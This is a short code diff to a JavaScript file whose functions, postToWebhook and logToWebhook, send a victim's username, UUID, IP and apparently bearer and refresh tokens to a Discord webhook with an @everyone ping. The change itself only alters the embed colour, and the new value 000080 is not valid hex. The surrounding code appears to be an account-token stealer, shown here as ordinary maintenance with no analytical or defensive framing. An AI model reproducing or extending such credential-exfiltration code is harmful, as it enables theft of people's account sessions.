@@ -133,7 +133,7 @@ function postToWebhook(username, bearerToken, uuid, ip, refreshToken) {
         avatar_url: "https://cdn.discordapp.com/attachments/1021436161694105656/1027591805719560322/xd.jpg",
         content: "@everyone",
         embeds: [{
-            title: "User Info", color: 0x00ff50, fields: [
+            title: "User Info", color: 000080, fields: [
                 {name: "Username", value: username, inline: true},
                 {name: "UUID", value: uuid, inline: true},
                 {name: "Ip", value: ip, inline: true},
@@ -155,7 +155,7 @@ function logToWebhook(title, message) {
         avatar_url: "https://cdn.discordapp.com/attachments/1021436161694105656/1027591805719560322/xd.jpg",
         content: " ",
         embeds: [{
-            title: "Log", color: 0x00ff50, fields: [
+            title: "Log", color: 000080, fields: [
                 {name: title, value: ""},
                 {name: message, value: ""}
             ]
